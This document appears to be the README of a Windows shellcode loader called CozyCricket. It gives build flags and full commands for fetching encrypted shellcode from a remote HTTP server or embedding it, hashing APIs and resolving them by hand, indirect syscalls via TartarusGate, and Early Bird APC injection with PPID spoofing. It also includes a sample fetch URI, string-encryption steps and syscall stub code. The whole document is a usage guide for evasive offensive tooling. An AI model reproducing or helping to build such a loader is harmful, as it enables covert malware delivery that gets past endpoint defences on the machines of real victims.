## About

### Flags

#### Payload fetch

- `RETRIEVE_FETCH`: fetch shellcode from remote server
- `RETRIEVE_LOCAL`: embed shellcode into the binary

#### Hash

- `HASH_DJB2`: use DJB2 for API/DLL hashing

#### Resolve library

- `RESOLVEDLL_TIB`: resolve DLL manually

#### Resolve WINAPI

- `RESOLVEAPI_DOS`: resolve WINAPI manually

#### Syscall

- `SYSCALL_INDIRECT`: indirect syscalls

#### PID search

- `FINDPID_GETNEXTPROCESS`: PID search via `NtGetNextProcess`,`GetProcessImageFileNameA`

#### SSN sort

- `GETSYSCALL_SORT_TARTARUS`: TartarusGate

#### Process injection

- `INJECT_EXTERNAL_EBAPC`: Early bird APC injection with PPID spoofing
- `INJECT_EXTERNAL_CREATE_MAP_SECTION`: Injection via `NtCreateSection`,`NtMapViewOfSection`

## Build

```bash
# install mingw
sudo apt install mingw-w64
sudo apt install nasm

# install vcpkg
git clone https://github.com/microsoft/vcpkg.git
cd vcpkg
./bootstrap-vcpkg.sh
export VCPKG_PATH=`pwd`
```

```bash
export CXX=x86_64-w64-mingw32-g++
rm -rf build

# build
cmake -S . -B build \
-DCMAKE_TOOLCHAIN_FILE="$VCPKG_PATH/scripts/buildsystems/vcpkg.cmake" \
-DVCPKG_TARGET_TRIPLET=x64-mingw-static \
-DCMAKE_EXPORT_COMPILE_COMMANDS=ON

# encrypt the shellcode
java EncryptFile.java $FILE $KEY

# define the KEY inside vars.hpp
vi static/vars.hpp

### MAKE REQUIRED ADJUSTMENTS (see ## Adjust)

cmake --build build --config Release -j
```

## Adjust

### Encrypt string

```bash
printf "kernel32\x00" > win32.bin
java EncryptFile.java ./win32.bin 'dsfjdshjfdsfdsfdsfydsgfydsgfuygdsifgdsiugfidsgfigdsu'
xxd -n eKernel32Dll -i win32.bin.enc
```

### Shellcode retrieval

#### Fetch using HTTP

1. modify `CMakeLists.txt` for a compiler to use the correct definition for `retrieve_bytecode()`

```cmakelists
add_definitions(-DRETRIEVE_FETCH)
```

2. write a URI to query into `static/vars.hpp`

```c
#define BYTECODE_URI "http://192.168.88.250:9595/build/tmp/agent.bin.enc"
```

#### Embed into the executable

1. modify `CMakeLists.txt` for a compiler to use the correct definition for `retrieve_bytecode()`

```cmakelists
add_definitions(-DRETRIEVE_LOCAL)
```

2. generate an hpp file that contains the encrypted shellcode

```bash
xxd -n eBytecode -i $PATH_TO_ENCRYPTED_SHELLCODE > static/bytecode.cpp
sed -i "1s/^/#include \"bytecode.hpp\"\n/" static/bytecode.cpp
```

## Development

Take a look at `.clangd` file and how it defines paths to libraries. Make sure you launch your IDE with the CozyCricket directory being the root of the project.

### Adding implementations with SYSCALL_INDIRECT

1. Add required function definitions to `syscall/syscalls.asm`
2. Declare functions in via `EXTERN_C`
3. Add an implementation by appending `#elifdef` directive where needed according to a corresponding interface definition in .hpp or add a new file optionally including conditional compilation directives
- edit `add_executable` (and `add_definitions` if you added `#*ifdef` blocks) within `CMakeLists.txt`
- regenerate build files via `cmake`

### Using hash functions

This project implements API/DLL hashing functionality. If you wish to hash your own string please consider using the built-in hash function of interest. After enabling the required compilation flags for the appropriate hashing function you can do something like this:

```cpp
std::cout << hash((const char*)"C:\\Windows\\SYSTEM32\\ntdll.dll") << std::endl;
```

You can also use a python script included in the root of the project

```bash
python3 djb2.py "C:\\Windows\\SYSTEM32\\ntdll.dll"
# 3579829573855646769

python3 djb2.py "NtWriteVirtualMemory"
# 13414142115590362032
```

### Adding WinAPI calls

```asm
section .text

global sysNtOpenProcess
sysNtOpenProcess:
    mov r10, rcx
    mov ax, word [SSN]
    jmp qword [rel syscallAddr]
    ret
```

```cpp
EXTERN_C NTSTATUS NTAPI sysNtOpenProcess(
    PHANDLE,
    ACCESS_MASK,
    POBJECT_ATTRIBUTES,
    PCLIENT_ID
);

NTSTATUS status = call(
    hashNtdll,
    hashNtOpenProcess,
    sysNtOpenProcess,
    &hParentProcess,
    PROCESS_CREATE_PROCESS,
    &pObjectAttributes,
    &pClientId
);
```

